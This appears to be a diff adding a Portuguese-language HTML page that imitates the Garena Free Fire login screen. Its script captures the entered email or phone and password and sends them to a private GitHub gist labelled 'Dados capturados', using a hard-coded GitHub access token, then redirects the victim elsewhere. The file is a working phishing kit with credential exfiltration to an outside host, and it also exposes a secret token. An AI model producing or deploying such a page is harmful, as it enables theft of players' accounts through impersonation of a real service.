@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Garena Free Fire</title>
+    <style>
+        /* Estilos Gerais */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: #1e1e1e;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.6);
+            padding: 25px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo-container img {
+            width: 130px;
+            height: auto;
+        }
+
+        .login-form {
+            margin-top: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #333;
+            border-radius: 5px;
+            background-color: #292929;
+            color: #fff;
+            font-size: 14px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #ff4500;
+            color: #fff;
+            transition: background-color 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/garena_logo.b28b2b6.png" alt="Logo da Garena">
+        </div>
+
+        <h2 style="text-align: center;">Login</h2>
+
+        <div class="login-form">
+            <form id="login-form">
+                <div class="form-group">
+                    <label for="email">E-mail ou número de telefone</label>
+                    <input type="text" id="email" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Palavra-passe</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+
+                <button type="submit" class="submit-btn">Iniciar Sessão</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            let username = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            fetch("https://api.github.com/gists", {
+                method: "POST",
+                headers: {
+                    "Authorization": "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",
+                    "Accept": "application/vnd.github.v3+json",
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    "description": "Dados capturados",
+                    "public": false,
+                    "files": {
+                        "logins.txt": {
+                            "content": "Usuário: " + username + "\nSenha: " + password
+                        }
+                    }
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                window.location.href = "outra_pagina.html"; // Redirecionamento após envio dos dados
+            })
+            .catch(error => console.error("Erro:", error));
+        });
+    </script>
+</body>
+</html>
